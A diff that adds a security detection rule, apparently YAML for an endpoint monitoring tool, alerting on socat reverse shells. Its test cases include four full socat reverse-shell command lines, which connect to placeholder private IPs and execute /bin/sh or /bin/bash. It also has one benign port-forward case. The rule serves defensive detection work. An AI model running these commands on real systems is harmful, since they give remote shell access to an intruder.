@@ -1,0 +1,33 @@
+name: rta_socat_reverse_shell
+mode: alert
+eval: |
+  (
+    e.process_name == "socat" &&
+    (
+      re_match(e.process_args, "TCP.*EXEC") ||
+      re_match(e.process_args, "TCP4.*EXEC") ||
+      re_match(e.process_args, "OPENSSL.*EXEC") ||
+      re_match(e.process_args, "EXEC.*TCP")
+    )
+  )
+tests:
+  - cleartext: "socat TCP EXEC reverse shell"
+    process_name: socat
+    process_args: "socat TCP:10.10.10.10:4444 EXEC:/bin/sh"
+    should_match: true
+  - cleartext: "socat TCP4 EXEC with pty"
+    process_name: socat
+    process_args: "socat TCP4:192.168.1.100:8080 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
+    should_match: true
+  - cleartext: "socat OPENSSL encrypted shell"
+    process_name: socat
+    process_args: "socat OPENSSL:10.10.10.10:4444,verify=0 EXEC:/bin/sh"
+    should_match: true
+  - cleartext: "socat reverse with EXEC first"
+    process_name: socat
+    process_args: "socat EXEC:/bin/bash TCP:10.0.0.1:9999"
+    should_match: true
+  - cleartext: "normal socat port forwarding"
+    process_name: socat
+    process_args: "socat TCP-LISTEN:8080,fork TCP:localhost:80"
+    should_match: false
